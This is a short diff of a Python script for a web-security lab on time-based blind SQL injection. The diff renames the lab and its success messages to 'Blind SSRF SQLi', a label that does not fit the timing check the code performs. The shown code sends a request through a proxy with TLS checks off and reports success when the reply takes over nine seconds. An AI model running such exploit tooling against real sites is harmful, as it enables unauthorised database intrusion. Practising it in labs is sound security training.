@@ -1,4 +1,4 @@
-# Lab: Blind SQLi with time delays
+# Lab: Blind SSRF SQLi with time delays
 import os
 import sys
 import urllib.parse
@@ -24,9 +24,9 @@ def execute_time_delay(url):
     r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
 
     if int(r.elapsed.total_seconds()) > 9:
-        print("(-> SQLi Blind attack successful !!!")
+        print("(-> SQLi Blind SSRF attack successful !!!")
     else:
-        print("(-) SQLi Blind attack unsuccessful !!!")
+        print("(-) SQLi Blind SSRF attack unsuccessful !!!")
         exit(-1)
 
 
